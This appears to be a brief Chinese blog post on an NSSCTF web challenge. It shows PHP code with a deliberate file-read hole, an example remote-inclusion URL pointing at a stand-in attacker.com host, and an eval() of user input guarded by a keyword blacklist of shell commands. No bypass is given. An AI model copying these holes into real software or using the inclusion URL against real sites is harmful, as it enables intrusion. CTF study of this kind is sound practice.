---
title: NSSCTFweb2
date: 2024-10-19 23:46:57
categories: CTF
tags: web
updated: 2024-10-19 23:46:57
---
The future
```php
 <?php
highlight_file(__FILE__);
error_reporting(0);
$file = $_REQUEST['file'];
$data = file_get_contents($file);
echo "File contents: $data";
//朴实无华，拿来就用    
File contents: 
```
一个简单的FIV文件包含漏洞
本地文件包含（LFI）
潜在的远程文件包含（RFI）漏洞
如果 PHP 配置中 allow_url_fopen 和 allow_url_include 设置为 On，攻击者甚至可以通过 file 参数引入远程文件，执行远程的恶意代码。假如配置不当，攻击者可以通过这样的 URL 进行远程文件包含：
http://example.com/vulnerable.php?file=http://attacker.com/malicious_code.php


```php
 <?php
highlight_file(__FILE__);
if(isset($_GET['code'])){
    $code=$_GET['code'];
if (!preg_match('/sys|pas|read|file|ls|cat|tac| |head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i',$code)){
     eval($code);  
        echo '<br>';
        echo '<img src="./dududadadudu.png" alt="Top Image" style="display: block; margin: 0 auto; max-width: 20%; height: auto;">'; 
        echo '<audio controls>';echo '<source src="./dududadudada.mp3" type="audio/mpeg">';
         } else {
        echo '<img src="./redhot.jpg" alt="Top Image" style="display: block; margin: 0 auto; max-width: 70%; height: auto;">'; 
        die("这都不能bypass？不准你玩cod"); }
    }  else {
    echo "喜欢用轮椅枪是吧，账号给你ban了！";
    echo '<img src="./ban.png" alt="Top Image" style="display: block; margin: 0 auto; max-width: 70%; height: auto;">'; 
} 
```